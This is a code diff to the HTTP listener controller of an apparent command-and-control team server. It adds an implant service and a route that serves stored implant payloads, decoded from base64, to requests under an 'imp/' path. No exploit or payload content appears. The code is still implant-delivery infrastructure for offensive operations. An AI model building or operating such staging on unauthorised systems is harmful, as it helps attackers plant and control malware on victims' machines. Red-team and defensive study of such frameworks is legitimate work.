@@ -34,6 +34,7 @@ namespace TeamServer.Models
         private readonly IFrameService _frameService;
         private readonly IServerService _serverService;
         private readonly IDownloadFileService _downloadFileService;
+        private readonly IImplantService _implantService;
         public HttpListenerController(IAgentService agentService,
             IFileService fileService,
             IListenerService listenerService,
@@ -46,7 +47,8 @@ namespace TeamServer.Models
             ITaskResultService agentTaskResultService,
             IFrameService frameService,
             IServerService serverService,
-            IDownloadFileService downloadFileService)
+            IDownloadFileService downloadFileService,
+            IImplantService implantService)
         {
             this._agentService=agentService;
             this._fileService = fileService;
@@ -61,6 +63,7 @@ namespace TeamServer.Models
             this._frameService = frameService;
             this._serverService=serverService;
             this._downloadFileService = downloadFileService;
+            this._implantService = implantService;
         }
 
         private async Task<IActionResult> WebHost(string path)
@@ -79,7 +82,15 @@ namespace TeamServer.Models
 
             try
             {
-                var fileContent = _webHostService.GetFile(path);
+                byte[] fileContent = null;
+                if (path.TrimStart('/').ToLower().StartsWith("imp/"))
+                {
+                    var implant = _implantService.GetImplantbyName(Path.GetFileNameWithoutExtension(path));
+                    if (implant != null)
+                        fileContent = Convert.FromBase64String(implant.Data);
+                }
+                else
+                    fileContent = _webHostService.GetFile(path);
 
                 if (fileContent == null)
                 {
@@ -158,6 +169,6 @@ namespace TeamServer.Models
                 throw ex;
             }
         }
-           
+
     }
 }
